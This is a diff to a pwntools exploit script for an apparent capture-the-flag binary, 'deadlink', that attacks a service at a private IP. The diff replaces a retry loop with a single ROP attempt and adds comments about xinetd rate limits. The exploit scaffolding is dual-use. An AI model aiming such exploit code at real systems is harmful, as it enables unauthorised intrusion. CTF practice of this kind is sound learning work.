@@ -35,7 +35,7 @@ import re, sys, os
 exe  = ELF("./deadlink", checksec=False)
 libc = ELF("./libc.so.6", checksec=False)
 context.binary = exe
-context.log_level = os.environ.get("LL", "warning")   # set LL=info to see every leak
+context.log_level = os.environ.get("LL", "info")
 
 HOST = os.environ.get("HOST", "172.16.38.22")
 PORT = int(os.environ.get("PORT", "6656"))
@@ -266,24 +266,13 @@ def attempt_before_data(r):
     return b"Data?" not in r
 
 def main():
-    import time
-    tries = int(os.environ.get("TRIES", "25"))
-    gap   = float(os.environ.get("GAP", "3"))   # seconds between attempts (avoid xinetd cps limit)
-    for i in range(tries):
-        print(f"[*] attempt {i+1}/{tries} (OFF={hex(OFF)})")
-        res = None
-        try:
-            res = attempt()
-        except Exception as e:
-            log.warning(f"attempt error: {type(e).__name__}: {e}")
-            try: io.close()
-            except: pass
-        if res == "flag" or (isinstance(res, str) and res.startswith("bcsctf")):
-            return
-        if res:  # ROP fired but no flag captured -> stop and let user see interactive
-            return
-        time.sleep(gap)     # spacing keeps the service's connection-rate limiter happy
-    log.failure("no success after retries; try OFF=0x48 / 0x20, or raise TRIES/GAP")
+    # SINGLE shot. The service is behind xinetd with a connection-rate limit, so
+    # do NOT hammer it in a loop (that trips the limiter and disables the service
+    # for a while). If this run fails, wait ~30-60s and run it again by hand.
+    res = attempt()
+    if not res:
+        log.failure("this attempt didn't land — wait ~60s (xinetd cps cooldown) then "
+                    "re-run; if it reaches 'Data?' but no flag, tell me; else try OFF=0x48/0x20")
 
 if __name__ == "__main__":
     main()
